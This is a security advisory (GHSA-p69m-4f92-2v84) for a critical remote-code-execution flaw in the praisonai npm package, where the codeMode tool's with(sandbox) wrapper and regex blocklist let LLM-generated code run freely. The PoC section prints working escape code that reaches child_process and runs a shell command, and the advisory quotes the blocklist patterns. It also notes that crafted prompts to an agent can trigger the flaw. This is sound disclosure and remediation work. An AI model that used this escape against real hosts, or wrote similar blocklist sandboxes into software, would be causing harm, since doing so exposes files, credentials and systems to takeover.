# [C] PraisonAI: Remote Code Execution via Sandbox Escape in `codeMode` Tool

## Summary
Severity: Critical
Advisory: GHSA-p69m-4f92-2v84
CVE: CVE-2026-57141
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-p69m-4f92-2v84
Type: github-advisory

## Affected
- npm: `praisonai` — affected >=0 <1.7.2

## Details
## Summary

The `codeMode` tool in `src/praisonai-ts/src/tools/builtins/code-mode.ts` uses `new Function()` with a `with(sandbox)` pattern to execute LLM-generated code. The blocklist-based "sandbox" can be trivially bypassed via `Function('return this')()` to recover the global object, followed by `global.require()` with string concatenation to evade the blocklist regex. This allows full arbitrary code execution on the host system. This affects all deployments where the code-mode tool is enabled for agents.
## Details
**Vulnerable code (lines 187–191):**
```typescript
const fn = new Function(
  'sandbox',
  `with (sandbox) { ${code} }`
);
const result = fn(sandbox);
```

The `code` parameter comes from LLM tool call arguments (the `execute` method at line 104). Before execution, a regex-based blocklist is applied (lines 108–136):

```typescript
const blockedPatterns = [
  /require\s*\(\s*['"]child_process['"]\s*\)/,
  /require\s*\(\s*['"]fs['"]\s*\)/,
  /import\s+.*from\s+['"]child_process['"]/,
  /process\.exit/,
  /eval\s*\(/,
];
```

**Three fundamental weaknesses:**

1. **`with(sandbox)` does not provide isolation.** The `with` statement in JavaScript adds an object to the scope chain but does NOT prevent accessing the global object. The sandbox object sets `process: undefined` and `require: undefined`, but these are recovered via the global scope:
   ```javascript
   const g = Function('return this')();
   g.require('child_' + 'process')
   ```

2. **Blocklist evasion via string concatenation.** The regex `/require\s*\(\s*['"]child_process['"]\s*\)/` requires the literal string `'child_process'` or `"child_process"` inside `require()`. Using `require('child_' + 'process')` bypasses this because the regex sees a variable concatenation, not a literal string.

3. **`Function('return this')()` is not blocked.** None of the blocklist patterns match `Function(`, `return this`, or `global.require`.

## PoC

**Setup:** Clean checkout at commit `d5f1114a`, Node.js v20.20.0 (tested environment).

**Positive trigger — full RCE with sandbox escape (OBSERVED OUTPUT):**
```javascript
// This code bypasses ALL blocklist patterns and achieves RCE:
const code = `
const Func = (function(){}).constructor;
const proc = Func('return process')();
console.log('process.version:', proc.version);
const g = Function('return this')();
const mod = 'child_' + 'process';
const cp = g.require(mod);
console.log('RCE:', cp.execSync('id').toString().trim());
`;
```

**Observed output (executed in this environment):**
```
OUT: process.version: v20.20.0
OUT: RCE: uid=1000(sondt23) gid=1000(sondt23) groups=1000(sondt23),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),983(docker),984(ollama)
```

The escape was confirmed by executing the exact code-mode sandbox pattern (`new Function('sandbox', 'with (sandbox) { ... }')`) with the blocklist applied first. ALL blocklist patterns were bypassed, and the `id` command returned the real system user ID.

**Negative control — blocklist correctly catches direct require:**
```javascript
const code = `require('child_process')`;
// Returns: "Blocked pattern detected: require\s*\(\s*['"]child_process['"]\s*\)"
```

**Negative control — blocklist correctly catches eval:**
```javascript
const code = `eval('process')`;
// Returns: "Blocked pattern detected: eval\s*\("
```

**Cleanup:** No persistence needed; the code runs in-process.

## Impact

An attacker who can influence the `code` parameter of the `codeMode` tool (via crafted prompts to an AI agent using praisonai-ts) achieves **full arbitrary code execution** on the host system. This includes:

- **Read/write any file** accessible to the process user
- **Execute arbitrary system commands** via `child_process`
- **Exfiltrate environment variables** containing API keys, tokens, and credentials
- **Install persistent backdoors** by writing to startup files
- **Move laterally** in containerized environments

## Suggested remediation

The `with(sandbox)` + blocklist pattern is fundamentally insecure and cannot be fixed with regex improvements. Replace it with:

1. **Use `vm` module with proper context isolation:**
```typescript
import { createContext, runInContext } from 'vm';
const sandbox = createContext({ /* safe globals only */ });
runInContext(code, sandbox, { timeout: 5000 });
```

2. **Or use `isolated-vm`** for true process-level isolation with separate V8 isolates.

3. **Or run code in a subprocess** (like the Python `_execute_code_sandboxed` pattern already used in `python_tools.py`) with a clean environment and resource limits.

4. If a blocklist approach must be retained, add patterns for:
   - `Function(` / `new Function`
   - `constructor` / `__proto__` / `prototype`
   - `return this` / `return global`
   - `global` / `globalThis` / `window`
   But note: blocklist approaches are inherently fragile and will continue to have bypasses.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-p69m-4f92-2v84
- https://github.com/MervinPraison/PraisonAI
